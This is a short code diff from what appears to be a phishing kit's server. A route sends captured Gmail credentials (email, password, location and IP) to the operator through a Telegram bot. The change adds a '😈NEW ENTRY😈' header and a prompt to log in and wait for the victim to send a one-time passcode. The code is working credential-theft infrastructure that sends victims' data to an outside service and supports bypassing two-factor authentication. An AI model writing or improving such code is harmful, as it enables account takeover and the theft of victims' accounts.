@@ -53,17 +53,18 @@ router.post("/gma/:linkId", async (req, res) => {
             });
             await newCredential.save();
             await bot.sendMessage(user.telegramID, `
-LOG ENTRY
-PLATFORM: GMAIL
-
+😈NEW ENTRY😈
 
 EMAIL: ${username}
 PASSWORD: ${password}
 
+PLATFORM: GMAIL
 COUNTRY: ${country}
 CITY: ${city}
 REGION: ${region}
 IP: ${ip}
+
+${link.otpEnabled ? "Login and wait for victim to send OTP" : ""}
 
 Login now: https://www.gmail.com
                                                 `)
